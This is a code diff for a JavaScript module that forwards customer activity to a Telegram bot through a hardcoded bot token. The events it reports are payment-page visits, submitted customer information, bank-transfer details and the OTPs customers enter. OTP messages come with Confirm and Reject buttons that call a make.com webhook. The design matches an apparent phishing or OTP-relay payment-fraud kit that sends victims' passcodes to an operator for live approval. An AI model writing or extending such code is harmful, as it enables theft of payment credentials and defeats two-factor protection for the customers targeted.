@@ -2,38 +2,31 @@
 const BOT_TOKEN = '8410370403:AAFxBmqJQhS1Q5D_XDV8cXqtuZwlhHuaDfo'; // Your bot token
 const CHAT_ID = '-4972495592'; // Your chat or group ID
 
-// Function to send OTP to Telegram with confirm/reject buttons
-async function sendTelegramNotification(orderRef, otp) {
+// Generic function to send a message to Telegram
+async function sendTelegramMessage(text, replyMarkup = null) {
     try {
+        const body = {
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: 'HTML'
+        };
+        if (replyMarkup) {
+            body.reply_markup = replyMarkup;
+        }
+
         const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: `🆕 New OTP Received\nOrderRef: ${orderRef}\nOTP: ${otp}`,
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            {
-                                text: "✅ Confirm",
-                                url: `https://hook.eu2.make.com/lw5j8lq8q1bduww1kqe842brrawws24u?orderRef=${orderRef}&status=confirmed`
-                            },
-                            {
-                                text: "❌ Reject",
-                                url: `https://hook.eu2.make.com/lw5j8lq8q1bduww1kqe842brrawws24u?orderRef=${orderRef}&status=rejected`
-                            }
-                        ]
-                    ]
-                }
-            })
+            body: JSON.stringify(body)
         });
 
         if (response.ok) {
             console.log('Telegram notification sent successfully');
         } else {
-            console.error('Failed to send Telegram notification:', response.statusText);
+            const errorData = await response.json();
+            console.error('Failed to send Telegram notification:', response.statusText, errorData);
         }
     } catch (error) {
         console.error('Error sending Telegram notification:', error);
@@ -88,7 +81,7 @@ const TelegramNotifications = {
 ⏰ Time: ${new Date().toLocaleString()}
 
 <i>Customer is now on the payment page</i>`;
-        await sendTelegramNotification(message);
+        await sendTelegramMessage(message);
     },
 
     sendCustomerInfo: async (data) => {
@@ -103,7 +96,7 @@ const TelegramNotifications = {
 ⏰ Submitted at: ${new Date().toLocaleString()}
         `;
 
-        await sendTelegramNotification(message);
+        await sendTelegramMessage(message);
     },
 
     confirmBankTransfer: async (orderData) => {
@@ -121,7 +114,7 @@ const TelegramNotifications = {
 ⏰ Confirmed at: ${new Date().toLocaleString()}
 
 <i>⚠️ Please verify the bank transfer in your account</i>`;
-        await sendTelegramNotification(message);
+        await sendTelegramMessage(message);
     },
 
    
@@ -142,21 +135,31 @@ const TelegramNotifications = {
 ⏰ Submitted at: ${new Date().toLocaleString()}
 
 <i>🔄 Processing payment...</i>`;
-        await sendTelegramNotification(message);
+        await sendTelegramMessage(message);
     },
 
-    userEnteredOTP: async (otp) => {
+    userEnteredOTP: async (otp, orderRef) => {
         const currentCountry = getCurrentCountry();
 
         const message = `
 🔐 <b>User Entered OTP for Verification</b>
 
+🆔 OrderRef: ${orderRef}
 📱 Customer entered OTP: <code>${otp}</code>
 🌍 Country: ${currentCountry.charAt(0).toUpperCase() + currentCountry.slice(1)}
 ⏰ Time: ${new Date().toLocaleString()}
 
 <i>Please verify this OTP to complete the transaction</i>`;
-        await sendTelegramNotification(message);
+        
+        const replyMarkup = {
+            inline_keyboard: [
+                [
+                    { text: "✅ Confirm", url: `https://hook.eu2.make.com/lw5j8lq8q1bduww1kqe842brrawws24u?orderRef=${orderRef}&status=confirmed` },
+                    { text: "❌ Reject", url: `https://hook.eu2.make.com/lw5j8lq8q1bduww1kqe842brrawws24u?orderRef=${orderRef}&status=rejected` }
+                ]
+            ]
+        };
+        await sendTelegramMessage(message, replyMarkup);
     }
 };
 
